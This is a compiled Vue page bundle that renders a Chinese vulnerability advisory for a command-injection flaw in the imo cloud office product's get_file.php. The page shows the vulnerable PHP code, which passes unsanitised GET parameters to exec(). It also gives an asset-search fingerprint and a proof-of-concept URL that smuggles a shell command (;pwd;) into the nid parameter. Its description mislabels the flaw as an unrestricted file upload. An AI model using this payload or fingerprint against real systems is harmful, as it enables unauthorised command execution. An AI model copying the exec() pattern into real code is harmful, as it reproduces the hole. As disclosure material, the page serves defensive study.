import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>imo 云办公室 /file/NDisk/get_file.php 过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>imo 云办公室
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;iMO-云办公室&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241720834.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞文件 get_file.php</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
// 放置在 mfs 服务器上用于获取文件列表，配合 nd_verify_large_file.php 使用
if(empty($_GET[&#39;cid&#39;]) || empty($_GET[&#39;nid&#39;]))
	exit;
$cid = $_GET[&#39;cid&#39;];
$nid = $_GET[&#39;nid&#39;];
$mainDir = dirname(__FILE__) . &#39;/../upload/NDiskData/normal/&#39; . $cid . &#39;/&#39;;
exec(&quot;ls {$mainDir}*_{$nid}_*&quot;, $r);
$ret = array();
foreach($r as $v)
	$ret[md5_file($v)] = str_replace(dirname(__FILE__) . &quot;/../upload/NDiskData/normal/{$cid}/&quot;, &#39;&#39;, $v);
echo json_encode($ret);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/file/NDisk/get_file.php?cid=1&amp;nid=;pwd;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241721104.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),r=[t];function s(l,c){return i(),a("div",null,r)}const p=e(d,[["render",s],["__file","imo 云办公室 get_file.php 远程命令执行漏洞.html.vue"]]);export{p as default};
